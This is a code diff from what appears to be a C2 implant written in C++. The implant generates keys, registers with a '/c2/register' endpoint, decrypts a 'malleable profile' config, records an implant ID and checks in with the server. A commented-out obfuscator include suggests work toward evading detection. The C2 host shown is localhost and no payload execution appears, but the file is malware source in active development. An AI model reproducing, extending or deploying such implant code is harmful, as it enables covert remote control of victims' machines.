@@ -13,15 +13,13 @@
 #include "crypto.h"
 #include "httpclient.h"
 #include "profile.h"
+#include "implant.h"
+#include "constants.h"
+#include "debug.h"
 
 using namespace std;
 //using namespace andrivet::ADVobfuscator;
 
-#ifndef DEBUG
-#define DEBUG 0
-#endif
-
-#define CONTENT_TYPE_JSON L"Content-Type: application/json"
 
 MalleableProfile* currentProfile;
 
@@ -52,57 +50,30 @@ int main()
 	int status = createBase64KeyPair(&privKey, &pubKey);
 
 	if (status != 0) {
-		cout << "Error creating key pair, aborting" << endl;
+		DEBUG_PRINTF("Error creating key pair, aborting\n");
 		exit(1);
 	}
 
-	rapidjson::Document registerDocument;
-	registerDocument.SetObject();
-	rapidjson::Document::AllocatorType& allocator = registerDocument.GetAllocator();
-	rapidjson::Value pubKeyVal(pubKey.c_str(), allocator);
-	registerDocument.AddMember("txid", pubKeyVal, allocator);
+	currentProfile = Register(C2_URL, pubKey, privKey);
 
+	if (currentProfile == NULL) {
+		DEBUG_PRINTF("Error registering, aborting\n");
+		exit(1);
+	}
 
-	rapidjson::StringBuffer buffer;
-	rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
-	registerDocument.Accept(writer);
-	const char* key_json = buffer.GetString();
-
-	PSIZE_T outSize = 0;
-
-	// Register
-	string res = HTTPRequest(L"POST", L"localhost", L"/c2/register", 8080, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
-	//string res_str = LPBYTEToString(res, GetLPBYTELength(res));
-	cout << "Received:" << endl;
-	cout << res << endl;
-	//cout << res_str << endl;
-	rapidjson::Document resDocument;
-	resDocument.Parse(res.c_str());
-	cout << "status: " << resDocument["status"].GetBool() << endl;
-	cout << "Config: " << endl;
-
-	const rapidjson::Value& c = resDocument["c"];
-	string c_str = c.GetString();
-	string cDecoded = base64DecodeToString(c_str);
-	string b64ServerPubKey = resDocument["k"].GetString();
-
-	// We still need to decrypt the config
-	string decryptedConfig = decryptB64String(b64ServerPubKey, privKey, c_str);
-	
-	cout << decryptedConfig << endl;
-
-	currentProfile = parseMalleableConfig(decryptedConfig, privKey);
-
-	cout << "Implant ID: " << currentProfile->implantId << endl;
+	DEBUG_PRINTF("Implant ID: %s\n", currentProfile->implantId.c_str());
 
 	// // do stuff with the response
 	Sleep(1);
+
+	PSIZE_T outSize = 0;
+
 	// // Checkin loop
-	string checkinRes = HTTPRequest(L"POST", L"localhost", L"/c2/checkin", 8080, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
+	string checkinRes = HTTPRequest(L"GET", L"localhost", L"/c2/checkin", 8080, L"Hello-world", CONTENT_TYPE_JSON, NULL, 0, outSize, FALSE);
 	rapidjson::Document document;
 	const char* answer_str = "{\"hello\": \"world\"}";
 	document.Parse(answer_str);
-	printf("hello = %s\n", document["hello"].GetString());
+	DEBUG_PRINTF("hello = %s\n", document["hello"].GetString());
 	return 0;
 }
 
